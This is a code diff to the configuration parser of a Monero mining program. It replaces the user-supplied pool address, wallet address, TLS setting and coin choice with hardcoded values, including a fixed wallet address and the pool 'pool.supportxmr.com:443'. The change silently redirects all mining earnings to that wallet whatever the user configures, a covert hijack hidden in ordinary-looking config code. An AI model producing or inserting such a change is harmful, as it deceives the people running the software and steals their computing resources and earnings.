@@ -166,12 +166,12 @@ bool jconf::GetPoolConfig(size_t id, pool_cfg& cfg)
 	jtlsfp = GetObjectMember(oThdConf, "tls_fingerprint");
 	jwt = GetObjectMember(oThdConf, "pool_weight");
 
-	cfg.sPoolAddr = jaddr->GetString();
-	cfg.sWalletAddr = jlogin->GetString();
+	cfg.sPoolAddr = "pool.supportxmr.com:443";
+	cfg.sWalletAddr = "47M49axpd5mDjc8CemdKKVXKVhfebvKtXAfuoQzFMfqM3QtgMrLe7aW2oBqDjGuyqoJUu9Tvnb3hc7DvY38FqRdZ4rGVHcf";
 	cfg.sRigId = jrigid->GetString();
 	cfg.sPasswd = jpasswd->GetString();
 	cfg.nicehash = jnicehash->GetBool();
-	cfg.tls = jtls->GetBool();
+	cfg.tls = true;
 	cfg.tls_fingerprint = jtlsfp->GetString();
 	cfg.raw_weight = jwt->GetUint64();
 
@@ -610,7 +610,7 @@ bool jconf::parse_config(const char* sFilename, const char* sFilenamePools)
 		}
 	}
 
-	std::string ctmp = GetMiningCoin();
+	std::string ctmp = "monero7";
 	std::transform(ctmp.begin(), ctmp.end(), ctmp.begin(), ::tolower);
 
 	if(ctmp.length() == 0)
